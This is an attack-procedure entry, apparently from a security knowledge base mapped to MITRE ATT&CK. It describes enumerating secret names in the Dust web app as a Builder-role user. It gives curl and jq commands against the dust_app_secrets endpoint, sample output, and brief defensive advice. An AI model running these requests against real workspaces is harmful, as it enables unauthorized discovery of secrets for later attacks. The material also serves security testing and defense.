---
id: proc-uuid-1
tags:
  - discovery
  - improper-access-control
  - dust-app
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/get-dust-app-secrets]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:30:46.841Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
---

# Enumerate-Secret-Names-as-Builder-User

## Summary

This procedure exploits improper access control in Dust's secret management API, allowing authenticated Builder users to list all secret names in a workspace via a GET request to the unprotected endpoint, revealing potential targets for further exploitation.

## Description

In the Dust application, the /api/w/[workspace_id]/dust_app_secrets endpoint lacks permission checks for Builder roles, which are intended only for viewing secrets. By sending an unauthorized GET request with a valid session, an attacker can enumerate all existing secret names, including those belonging to other users or apps. This enables discovery of sensitive configurations like API keys without exposing values (which are masked), but sets the stage for targeted tampering. The attack requires authentication as a Builder in the target workspace and knowledge of the workspace_id.

## Requirements

1. Valid authentication token/session as Builder role user
2. Knowledge of the target workspace_id
3. Network access to https://dust.tt API
4. Tool like curl for HTTP requests

## Defense

Defensive measures and detection strategies:

- Implement role-based access control (RBAC) checks on all secret endpoints, restricting Builders to read-only for their own secrets
- Log all API requests to secret endpoints and alert on anomalous access patterns from Builder accounts
- Use rate limiting and input validation to prevent enumeration abuse

## Objectives

1. Discover all secret names in the workspace for targeting
2. Identify high-value secrets like API keys for subsequent attacks
3. Validate lack of permission enforcement on listing operations

## Instructions

### Step 1: Authenticate and Prepare Request

**Context**: Ensure you have a valid Builder session cookie (appSession) from logging into Dust.tt.

Replace [workspace_id] with the actual ID and [appSession] with your cookie value.

**Command** ([[commands/get-dust-app-secrets]]):
```bash
curl -X GET "https://dust.tt/api/w/[workspace_id]/dust_app_secrets" -H "Cookie: [appSession]"
```

> This command sends a GET request to the endpoint. Expected output is a JSON array of secrets with names exposed and values masked (e.g., {"secrets": [{"id":"123","name":"API_KEY","value":"•••••••","created_at":"2023-01-01"}]}). Success confirms enumeration without errors.

### Step 2: Parse and Analyze Response

**Context**: Review the response to list secret names for potential overwrite targets.

Use jq or manual inspection to extract names.

**Command** (jq parse):
```bash
curl -X GET "https://dust.tt/api/w/[workspace_id]/dust_app_secrets" -H "Cookie: [appSession]" | jq '.secrets[].name'
```

> Outputs a list of secret names, e.g., "API_KEY\nDB_PASSWORD". This step identifies exploitable secrets.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/get-dust-app-secrets]]

## Tools Used


## Tags

- [[Discovery]]
- [[improper-access-control]]
- [[dust-app]]
